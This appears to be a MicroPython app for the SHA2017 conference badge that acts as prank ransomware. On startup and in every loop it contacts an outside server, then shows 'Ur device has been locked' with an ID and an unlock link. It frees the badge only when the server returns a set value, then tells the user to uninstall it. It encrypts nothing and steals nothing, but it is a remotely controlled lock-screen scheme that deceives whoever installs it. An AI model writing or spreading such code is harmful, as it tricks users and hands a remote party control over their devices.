import badge, ugfx, wifi, time
import urequests as requests

#badge.leds_enable()
#leds_array = bytes([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100])
#badge.leds_send_data(leds_array)

_continue = 1     
        
def test():
    badge.vibrator_activate(0xFF)
    
    
def await_wifi():
    while not wifi.sta_if.isconnected():
        time.sleep(0.1)
        pass
      
def setup(): 
    ugfx.init()
    badge.init()
    wifi.init()
    await_wifi()
    
    t = requests.get("http://project1.online/sha2017-plsdonthackme/show.php?id=13&type=up")
    _id = t.content
    test()
    if str(int(_id)) == "6":
        global _continue
        _continue = 0
    
    
    ugfx.input_init()
    ugfx.input_attach(ugfx.BTN_START, lambda pressed: test())
    
def loop():
    ugfx.input_init()
    ugfx.input_attach(ugfx.BTN_START, lambda pressed: test())

    global _continue
        
    if (_continue):
       

        ugfx.clear(ugfx.BLACK)
        ugfx.line(0, 30, 300, 33, ugfx.WHITE)
        ugfx.string(80, 10, "Ooohh no :'(", "DejaVuSans20", ugfx.WHITE)
        ugfx.string(3, 30, 'Ur device has been locked', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.flush()
        
        
        wifi.init()
        await_wifi()
        
        leds_array = bytes([0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100, 0, 255, 0, 100])
        badge.leds_send_data(leds_array)
        
        t = requests.get("http://project1.online/sha2017-plsdonthackme/show.php?id=13&type=up")
        r_id = t.content
        
        ugfx.string(3, 55, 'Your ID is: {}'.format(str(int(r_id))), 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 80, 'unlock ur badge 4 free ;)', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 105, 'at imgur.com/11L2v2H', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.flush()
        
    else:     
        leds_array = bytes([255, 0, 0, 100, 255, 0, 0, 100, 255, 0, 0])
        badge.leds_send_data(leds_array)
        
        ugfx.clear(ugfx.BLACK)
        ugfx.line(0, 30, 300, 33, ugfx.WHITE)
        ugfx.string(80, 10, "Ooohh yes :)", "DejaVuSans20", ugfx.WHITE)
        ugfx.string(3, 30, 'Ur device is UN-locked', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 55, 'dont fall for this again', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 80, 'uninstall the app to ', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.string(3, 105, 'remove this message', 'Roboto_BlackItalic24', ugfx.WHITE)
        ugfx.flush()
    return 100